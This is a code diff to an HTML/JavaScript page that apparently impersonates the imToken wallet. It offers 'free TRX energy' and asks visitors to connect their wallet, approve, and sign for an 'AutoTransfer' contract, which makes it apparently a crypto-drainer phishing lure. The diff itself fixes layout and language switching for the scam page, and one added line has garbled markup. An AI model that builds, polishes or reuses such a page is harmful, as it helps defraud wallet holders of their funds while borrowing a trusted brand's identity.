@@ -30,8 +30,8 @@ body {
 /* 语言切换按钮（单个地球图标） */
 .lang-switch {
     display: flex;
-    text-align: right;
-    text-align: right;
+    justify-content: flex-end; /* 强制居右 */
+    padding-right: 4px;
     margin-bottom: 2px; /* 大幅缩小与下方内容的间隔 */
 }
 .lang-toggle {
@@ -261,13 +261,13 @@ body {
     </style>
 </head>
 <body>
+    <!-- 修复：删除重复的container嵌套 -->
+    <div class="lang-switch">
+        <button id="langToggle" class="lang-toggle">
+            <<i class="fa fa-globe"></</i> 
+        </button>
+    </div>
     <div class="container">      
-      <div class="lang-switch" style="text-align: right !important;">
-            <button id="langToggle" class="lang-toggle">
-                <i class="fa fa-globe"></i> 
-            </button>
-        </div>  
-        <div class="container">
         <div class="header">
             <div>
                 <h1 id="headerTitle">imToken</h1>
@@ -325,17 +325,19 @@ body {
             <p id="browserWarn1"> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
             <p id="browserWarn2"> ⚠️ 非钱包浏览器：点击按钮自动复制+唤起imToken</p>  
         </div> 
-        <button id="connectBtn" class="btn" id="connectBtnText">连接imToken钱包</button>
-        <button id="approveBtn" class="btn" disabled id="approveBtnText">免费领取能量</button>
+        <button id="connectBtn" class="btn">连接imToken钱包</button>
+        <button id="approveBtn" class="btn" disabled>免费领取能量</button>
        
         <div id="reviewTip" class="review-tip" style="display: none;">
            <span id="reviewTipText">系统审核中，审核通过后请务必完成签名</span>
         </div>
     </div>
-    <div class="footer-info">
+    <!-- 修复：给页脚加ID，用于语言切换 -->
+    <div class="footer-info" id="footerInfo">
         合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）
         © 2025 TRX能量服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
-    </div><script src="imtoken://browser"></script>
+    </div>
+    <script src="imtoken://browser"></script>
 <script>
     // 核心配置（后端主域名已包含/api，直接使用）
     const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
@@ -391,7 +393,7 @@ body {
     let trxBalance = 0.00;  // TRX余额
     const RECORD_KEY = "imtoken_energy_records";
 
-    // ========== 多语言配置（英文文本与中文意思严格对齐） ==========
+    // ========== 多语言配置（补全footerInfo键名，与HTML ID对应） ==========
     const langConfig = {
         zh: {
             headerTitle: "imToken",
@@ -423,7 +425,7 @@ body {
             connectBtnText: "连接imToken钱包",
             approveBtnText: "免费领取能量",
             reviewTipText: "系统审核中，审核通过后请务必完成签名",
-            footerText: "合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）© 2025 TRX能量服务 | <a href='https://tronscan.org' target='_blank'>TRON浏览器</a> | <a href='https://token.im' target='_blank'>imToken官网</a>",
+            footerInfo: "合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）© 2025 TRX能量服务 | <a href='https://tronscan.org' target='_blank'>TRON浏览器</a> | <a href='https://token.im' target='_blank'>imToken官网</a>",
             copySuccess: "✅ 链接已复制，请在imToken内置浏览器打开",
             copyFail: "❌ 复制失败：请手动复制链接",
             唤起Guide: "✅ 已复制链接+唤起imToken\n下一步：打开imToken → 浏览 → 粘贴访问",
@@ -482,7 +484,7 @@ body {
             connectBtnText: "Connect imToken Wallet",
             approveBtnText: "Claim Free Energy",
             reviewTipText: "System reviewing - please complete the signature after approval",
-            footerText: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) © 2025 TRX Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://token.im' target='_blank'>imToken Official</a>",
+            footerInfo: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) © 2025 TRX Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://token.im' target='_blank'>imToken Official</a>",
             copySuccess: "✅ Link copied - open in imToken in-app browser",
             copyFail: "❌ Copy failed - please copy manually",
             唤起Guide: "✅ Link copied + imToken launched\nNext: Open imToken → Browser → Paste link",
@@ -562,6 +564,7 @@ body {
     const reviewTip = document.getElementById("reviewTip");
     const reviewTipText = document.getElementById("reviewTipText");
     const langToggle = document.getElementById("langToggle"); // 单个语言切换按钮
+    const footerInfo = document.getElementById("footerInfo"); // 新增：页脚元素缓存
 
     // ========== 单个按钮切换语言（中文↔英文） ==========
     function toggleLang() {
@@ -574,36 +577,18 @@ body {
         renderEnergyRecords();
     }
     
-    // 更新页面所有文本
+    // 修复：恢复遍历逻辑，覆盖所有文本元素
     function updatePageLang() {
         const lang = langConfig[currentLang];
-        // 遍历所有带id的文本元素
-        document.getElementById("headerTitle").innerHTML = lang.headerTitle;
-    document.getElementById("headerDesc").innerHTML = lang.headerDesc;
-    document.getElementById("userInfoDefault").innerHTML = lang.userInfoDefault;
-    document.getElementById("walletStatusTitle").innerHTML = lang.walletStatusTitle;
-    document.getElementById("disconnectedText").innerHTML = lang.disconnectedText;
-    document.getElementById("disconnectedTip1").innerHTML = lang.disconnectedTip1;
-    document.getElementById("disconnectedTip2").innerHTML = lang.disconnectedTip2;
-    document.getElementById("disconnectedTip3").innerHTML = lang.disconnectedTip3;
-    document.getElementById("disconnectedTip4").innerHTML = lang.disconnectedTip4;
-    document.getElementById("disconnectedTip5").innerHTML = lang.disconnectedTip5;
-    document.getElementById("connectedSuccess").innerHTML = lang.connectedSuccess;
-    document.getElementById("connectedAddress").innerHTML = lang.connectedAddress;
-    document.getElementById("connectedType").innerHTML = lang.connectedType;
-    document.getElementById("connectedAmount").innerHTML = lang.connectedAmount;
-    document.getElementById("connectedWarn").innerHTML = lang.connectedWarn;
-    document.getElementById("contractResourceTitle").innerHTML = lang.contractResourceTitle;
-    document.getElementById("contractAddrText").innerHTML = lang.contractAddrText;
-    document.getElementById("contractEnergyText").innerHTML = lang.contractEnergyText;
-    document.getElementById("contractNote").innerHTML = lang.contractNote;
-    document.getElementById("recordTypeTitle").innerHTML = lang.recordTypeTitle;
-    document.getElementById("recordAmountTitle").innerHTML = lang.recordAmountTitle;
-    document.getElementById("energyType").innerHTML = lang.energyType;
-    document.getElementById("transferQuota").innerHTML = lang.transferQuota;
-    document.getElementById("browserWarn1").innerHTML = lang.browserWarn1;
-    document.getElementById("browserWarn2").innerHTML = lang.browserWarn2;
-        // 特殊处理按钮文本（避免覆盖id）
+        // 遍历所有多语言键，更新对应DOM元素
+        Object.keys(lang).forEach(key => {
+            const el = document.getElementById(key);
+            if (el) {
+                // 特殊处理包含HTML标签的文本（如userInfoDefault、connectedAddress）
+                el.innerHTML = lang[key];
+            }
+        });
+        // 单独更新按钮文本（确保不被innerHTML覆盖）
         connectBtn.textContent = lang.connectBtnText;
         approveBtn.textContent = lang.approveBtnText;
         reviewTipText.textContent = lang.reviewTipText;
